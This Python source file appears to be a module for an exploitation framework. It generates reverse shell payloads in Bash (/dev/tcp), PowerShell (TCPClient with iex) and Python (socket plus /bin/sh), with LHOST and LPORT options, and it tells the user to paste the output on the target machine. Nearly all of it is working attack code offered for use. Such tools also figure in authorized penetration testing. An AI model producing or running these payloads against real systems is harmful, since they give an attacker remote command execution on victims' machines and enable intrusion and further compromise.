class Exploit:
    name = "Reverse Shell Generator"
    description = "Generates reverse shell payloads for Bash, PowerShell, or Python"
    options = {
        "LHOST": "127.0.0.1",
        "LPORT": "4444",
        "FORMAT": "bash"  # bash, powershell, or python
    }

    def run(self):
        lhost = self.options["LHOST"]
        lport = self.options["LPORT"]
        format = self.options["FORMAT"].lower()

        if format == "bash":
            payload = f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
        elif format == "powershell":
            payload = (
                f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
                f"$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};"
                f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;"
                f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
                f"$sendback = (iex $data 2>&1 | Out-String );"
                f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
                f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
                f"$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}"
            )
        elif format == "python":
            payload = (
                f"import socket,subprocess,os;"
                f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                f"s.connect(('{lhost}',{lport}));"
                f"os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
                f"subprocess.call(['/bin/sh','-i'])"
            )
        else:
            print("[!] Invalid FORMAT. Use bash, powershell, or python.")
            return

        print("\n[+] Reverse Shell Payload:")
        print("----------------------------------")
        print(payload)
        print("----------------------------------")
        print("Paste this on the target machine.")
